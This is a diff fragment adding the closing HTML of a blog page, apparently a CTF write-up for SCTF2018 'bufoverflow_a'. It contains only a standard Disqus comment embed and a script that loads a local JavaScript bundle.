+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'f0r1st';
+    
+    var disqus_url = 'http://yoursite.com/2018/06/21/SCTF2018-bufoverflow-a-WriteUp/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//f0r1st.disqus.com/count.js" async></script>
+
+
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
